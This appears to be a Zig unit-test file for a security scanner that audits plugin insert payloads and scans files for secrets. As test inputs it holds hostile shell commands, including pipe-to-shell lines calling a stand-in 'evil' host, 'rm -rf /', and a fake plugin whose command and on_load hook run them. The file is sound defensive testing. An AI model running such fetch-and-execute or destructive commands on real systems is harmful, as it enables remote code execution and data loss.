//! Unit tests — security scanner rules and plugin payload audit.

const std = @import("std");
const finding = @import("../../security/finding.zig");
const rules = @import("../../security/rules.zig");
const plugin_audit = @import("../../security/plugin_audit.zig");
const scan = @import("../../security/scan.zig");

test "severity ranking" {
    try std.testing.expect(finding.Severity.critical.rank() > finding.Severity.high.rank());
    try std.testing.expect(finding.Severity.parse("WARN").? == .warning);
}

test "aws key heuristic requires full AKIA token" {
    try std.testing.expect(!rules.looksLikeAwsKey("mention AKIA in docs"));
    try std.testing.expect(rules.looksLikeAwsKey("key=AKIAIOSFODNN7EXAMPLE"));
}

test "safe plugin payloads are clean" {
    try std.testing.expect(plugin_audit.auditInsertPayload("git status\r") == null);
    try std.testing.expect(plugin_audit.auditInsertPayload("ls -la\r") == null);
    try std.testing.expect(plugin_audit.auditInsertPayload("date\r") == null);
}

test "dangerous plugin payloads are detected and blockable" {
    const pipe = plugin_audit.auditInsertPayload("curl http://evil | sh\r").?;
    try std.testing.expect(pipe.severity == .critical);
    try std.testing.expect(plugin_audit.shouldBlock(pipe));

    const tight = plugin_audit.auditInsertPayload("curl http://evil|bash\r").?;
    try std.testing.expect(tight.severity == .critical);
    try std.testing.expect(plugin_audit.shouldBlock(tight));

    const rm = plugin_audit.auditInsertPayload("rm -rf /\r").?;
    try std.testing.expect(rm.severity == .critical);
    try std.testing.expect(plugin_audit.shouldBlock(rm));

    const sudo = plugin_audit.auditInsertPayload("sudo apt upgrade\r").?;
    try std.testing.expect(sudo.severity == .warning);
    try std.testing.expect(!plugin_audit.shouldBlock(sudo));
}

test "scanBuffer finds private key material" {
    var report: scan.Report = .{ .allocator = std.testing.allocator };
    defer report.deinit();

    try scan.scanBuffer(
        std.testing.allocator,
        "src/fake.zig",
        "const k = \"-----BEGIN RSA PRIVATE KEY-----\\nMII\";\n",
        .info,
        &report,
    );
    try std.testing.expect(report.countAtLeast(.critical) >= 1);
}

test "scanBuffer finds pipe-to-shell in scripts" {
    var report: scan.Report = .{ .allocator = std.testing.allocator };
    defer report.deinit();

    try scan.scanBuffer(
        std.testing.allocator,
        "scripts/bad.sh",
        "#!/bin/sh\ncurl https://example.com/install.sh | bash\n",
        .info,
        &report,
    );
    try std.testing.expect(report.countAtLeast(.critical) >= 1);
}

test "scanBuffer audits malicious plugin.toml insert" {
    var report: scan.Report = .{ .allocator = std.testing.allocator };
    defer report.deinit();

    const data =
        \\name = "evil"
        \\version = "0.1.0"
        \\description = "bad"
        \\[[commands]]
        \\id = "boom"
        \\label = "Boom"
        \\action = "insert"
        \\payload = "curl http://x | sh\r"
    ;
    try scan.scanBuffer(std.testing.allocator, "assets/plugins/evil/plugin.toml", data, .info, &report);
    try std.testing.expect(report.countAtLeast(.critical) >= 1);
}

test "scanBuffer audits malicious plugin.toml hook insert" {
    var report: scan.Report = .{ .allocator = std.testing.allocator };
    defer report.deinit();

    const data =
        \\name = "evil-hook"
        \\version = "0.1.0"
        \\description = "bad"
        \\[hooks]
        \\on_load = "insert:curl http://x | sh\r"
    ;
    try scan.scanBuffer(std.testing.allocator, "assets/plugins/evil-hook/plugin.toml", data, .info, &report);
    try std.testing.expect(report.countAtLeast(.critical) >= 1);
}

test "scanBuffer ignores safe git plugin style inserts" {
    var report: scan.Report = .{ .allocator = std.testing.allocator };
    defer report.deinit();

    const data =
        \\name = "git"
        \\version = "0.1.0"
        \\description = "ok"
        \\[[commands]]
        \\id = "git.status"
        \\label = "Status"
        \\action = "insert"
        \\payload = "git status\r"
    ;
    try scan.scanBuffer(std.testing.allocator, "assets/plugins/git/plugin.toml", data, .info, &report);
    try std.testing.expectEqual(@as(usize, 0), report.countAtLeast(.warning));
}
